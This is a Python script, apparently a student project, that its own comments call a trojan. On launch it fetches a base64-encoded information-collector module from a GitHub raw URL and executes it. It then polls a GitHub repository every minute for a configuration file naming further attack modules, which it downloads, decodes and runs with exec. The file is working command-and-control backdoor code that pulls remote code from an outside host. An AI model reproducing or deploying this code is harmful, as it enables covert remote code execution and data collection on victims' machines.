
import importlib
import requests
import time
from github import Github
import base64

'''Don't forget to explain, the reason for placing the imports inside the function is because if I don't do that my trojan script won't work properly'''
'''Every time I run a script it will ask to place the import in my trojan, so I can't create a new script and run it while trojan is already running'''
'''Whereas if I place the import inside the function I don't have to import it in my trojan too'''
class Trojan:
    def __init__(self):
        self.run_InformationCollector()
   
    def launch_attack(self):
        '''This functin will launch the attack specified on the module_url'''
        ACCESS_TOKEN =""
        g = Github(ACCESS_TOKEN)
        OWNER = "rsecurity12"
        REPO_NAME = "python_opdracht"
        FILE_PATH = "Configuration"
        try:
            repo = g.get_repo(f"{OWNER}/{REPO_NAME}")
            file_content = repo.get_contents(FILE_PATH)
            script = file_content.decoded_content.decode().strip()
            module_url = f'https://raw.githubusercontent.com/{OWNER}/{REPO_NAME}/main/modules/{script}'           
            module_response = requests.get(module_url)
            if module_response.status_code == 200:
                tmp_module_code = module_response.text.strip()
                module_code = self.base64_to_text(tmp_module_code)
                module_name = module_url.split("/")[-1].split(".")[0]
                module = compile(module_code, module_name, "exec")
                exec(module)
        except Exception as e:
            print(e)
                 
    def run_InformationCollector(self):
        '''This function will run automatically when we first start our trojan'''
        informationCollector_url = 'https://raw.githubusercontent.com/rsecurity12/invoice/main/modules/InformationCollector.py'
        informationCollector_text_tmp = requests.get(informationCollector_url).text
        informationCollector_text = self.base64_to_text(informationCollector_text_tmp)
        informationCollector_spec = importlib.util.spec_from_loader("InformationCollector", loader=None)
        informationCollector = importlib.util.module_from_spec(informationCollector_spec)
        exec(informationCollector_text, informationCollector.__dict__)
        informationCollector.InformationCollector("InformationCollector")
    
    def base64_to_text(self,encoded_string):
        '''This function is responsible for decoding from base64 to text'''
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_text = decoded_bytes.decode('utf-8')
        return decoded_text
      
    def run_trojan(self):
        '''This function is our trojan motor. It will keep running and every x time it will launch an attack, if any available'''
        while True:
            try:
                print("blabla")   # dit moet weg
                self.launch_attack()
                time.sleep(60)  # Delay for 5 minutes (300 seconds)
            except KeyboardInterrupt:
                pass

trojan = Trojan()
trojan.run_trojan()

